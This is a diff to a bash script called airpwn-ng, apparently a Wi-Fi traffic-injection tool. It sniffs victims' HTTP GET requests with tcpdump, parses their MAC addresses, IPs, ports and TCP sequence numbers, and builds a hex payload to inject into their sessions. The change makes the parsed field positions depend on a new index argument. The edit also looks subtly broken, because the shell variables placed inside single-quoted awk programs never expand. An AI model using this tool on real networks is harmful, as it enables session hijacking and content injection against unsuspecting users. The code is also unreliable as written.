@@ -74,28 +74,28 @@
 monitor--()
 {
 ## src MAC -- Victim
-vicmac=$(awk '{print $15}' LOG | cut -d: -f 2-)
+vicmac=$(awk '{print $i0}' LOG | cut -d: -f 2-)
 
 ## src MAC -- Router LAN MAC
-rtrmac=$(awk '{print $16}' LOG | cut -d: -f 2-)
+rtrmac=$(awk '{print $i1}' LOG | cut -d: -f 2-)
 
 ## src IP -- Victim
-vicip=$(awk '{print $34}' LOG | cut -d. -f -4)
+vicip=$(awk '{print $i2}' LOG | cut -d. -f -4)
 
 ## src port -- Victim
-vicport=$(awk '{print $34}' LOG | cut -d. -f 5-)
+vicport=$(awk '{print $i2}' LOG | cut -d. -f 5-)
 
 ## dst IP -- Server
-svrip=$(awk '{print $36}' LOG | cut -d. -f -4)
+svrip=$(awk '{print $i3}' LOG | cut -d. -f -4)
 
 ## svr port -- Server
-svrport=$(awk '{print $36}' LOG | cut -d. -f 5- | sed 's/://')
+svrport=$(awk '{print $i3}' LOG | cut -d. -f 5- | sed 's/://')
 
 ## sequence number + length
-acknum=$(awk '{print $40}' LOG | cut -d: -f2 | sed 's/,//')
+acknum=$(awk '{print $i4}' LOG | cut -d: -f2 | sed 's/,//')
 
 ## old acknowledgement number
-seqnum=$(awk '{print $42}' LOG | sed 's/,//')
+seqnum=$(awk '{print $i5}' LOG | sed 's/,//')
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
@@ -108,25 +108,33 @@ hdr="\033[1;34m" ## Headers
 inp="\033[36m"   ## Inputs
 wtf="\033[34m"   ## WTFs
 rst="\e[0m"      ## Reset
-current_ver=1.0
-rel_date="21 April 2015"
+current_ver=1.2
+rel_date="22 April 2015"
 
 if [[ "$UID" -ne 0 ]];then
         echo -e "$wrn\nMust be ROOT to run this script$rst"
         exit 1
 fi
 
-if [[ -z $1  || -z $2 || -z $3 ]]; then
-	echo -e "$ins\nUsage: ./airpwn-ng <Inject File> <Sniff NIC> <Inject NIC>$rst"
+if [[ -z $1  || -z $2 || -z $3 || -z $4 ]]; then
+	echo -e "$ins\nUsage: ./airpwn-ng <Inject File> <Sniff NIC> <Inject NIC> <Index Value>$rst"
 	exit 1
 fi
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ MAIN ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
+## Prepare the indexes
+index=$4
+i0=$(expr $index + 1)
+i1=$(expr $index + 2)
+i2=$(expr $index + 20)
+i3=$(expr $index + 22)
+i4=$(expr $index + 26)
+i5=$(expr $index + 28)
+
 ## Prepare the hex inject string
 inject=$(echo "0x$(cat $1 | xxd -g1 -ps | fold -w2 | paste -sd ' ')")
-
 while true; do
 	tcpdump -i $2 -c 1 -eKnSt 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' 1>LOG &
 	inotifywait -r -e modify ./LOG
